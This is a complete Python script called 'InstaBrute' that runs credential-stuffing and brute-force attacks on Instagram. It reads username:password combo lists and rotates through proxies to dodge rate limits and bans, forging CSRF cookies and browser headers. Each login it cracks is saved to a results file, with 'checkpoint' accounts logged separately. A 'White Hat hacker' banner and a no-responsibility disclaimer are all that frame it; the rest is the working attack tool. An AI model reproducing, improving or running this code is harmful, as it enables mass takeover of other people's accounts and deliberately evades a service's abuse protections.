#!/usr/bin/python2.7
import requests, sys, threading, time, os, random
from random import randint
CheckVersion = str(sys.version)

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
rr = '\033[39m'




class InstaBrute(object):
    def __init__(self):
        self.cls()
        self.print_logo()
        try:
            Combo = raw_input(' Combo.txt --> ')
            Proxy = raw_input(' Proxy.txt --> ')
            self.cls()
            self.print_logo()
        except:
            self.cls()
            self.print_logo()
            print('  [-] Error : SomeThing Not true!')
            sys.exit()

        self.proxylist = list(open(Proxy).read().splitlines())
        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            if self.Coutprox >= len(self.proxylist):
                self.Coutprox = 0
            proxy = self.Generate_Proxy(self.Coutprox)
            self.Coutprox = self.Coutprox + 1
            user = combo.split(':')[0]
            password = combo.split(':')[1]
            try:
                t = threading.Thread(target=self.Go, args=(user, password,
                                                           str(proxy)))

                t.start()
                thread.append(t)
                time.sleep(0.1)
            except:
                pass
        for j in thread:
            j.join()
        input(' BruteForce Is Done! Press Enter to Exit...')
    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def Generate_Proxy(self, num):
        return self.proxylist[num]

    def print_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """
                     White Hat hacker
                  _____           _        ____             _       
                 |_   _|         | |      |  _ \           | |      
                   | |  _ __  ___| |_ __ _| |_) |_ __ _   _| |_ ___ 
                   | | | '_ \/ __| __/ _` |  _ <| '__| | | | __/ _ |
                  _| |_| | | \__ \ || (_| | |_) | |  | |_| | ||  __/
                 |_____|_| |_|___/\__\__,_|____/|_|   \__,_|\__\___|
                    GitHub.com/04x                    Iran-Cyber.NeT                                                 
                    
            Note! : We don't Accept any responsibility for any illegal usage.       
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)

    def Header(self, user, password, sess):
        headers = {
            'Host': 'www.instagram.com',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.instagram.com/',
            'X-CSRFToken': '',
            'X-Instagram-AJAX': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': '',
            'Cookie': '',
            'Connection': 'keep-alive'
        }
        datas = {'username': user, 'password': password}
        headers['X-CSRFToken'] = sess.cookies['csrftoken']
        headers['Cookie'] = "mid={}; csrftoken={}; ig_pr=1; ig_vw=1366".format(sess.cookies['mid'],
                                                                               sess.cookies['csrftoken'])
        lenthofData = str(19 + len(datas['username']) + len(datas['password']))
        headers['Content-Length'] = lenthofData
        return headers, datas

    def Go(self, user, password, proxyz):
        try:
            proxy = {'http': proxyz}
            Heddata = requests.get('https://www.instagram.com', proxies=proxy, timeout=10)
            sess = requests.session()
            headers, datas = self.Header(user, str(password), Heddata)
            GoT = sess.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=datas,
                            proxies=proxy, timeout=10)
            if 'authenticated": true' in GoT.text:
                print(g + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> Hacked!')
                with open('results.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
            elif 'Please wait a few minutes before you try again' in GoT.text:
                print(' ' + proxyz + ' Banned! --> Changing IP Address...')
                try:
                    self.Coutprox = self.Coutprox + 1
                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
                except:
                    self.Coutprox = self.Coutprox - 2
                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
            elif 'checkpoint_required' in GoT.text:
                print(y + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> You Must verfiy!')
                with open('results_NeedVerfiy.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
            else:
                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')
        except:
                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')

InstaBrute()
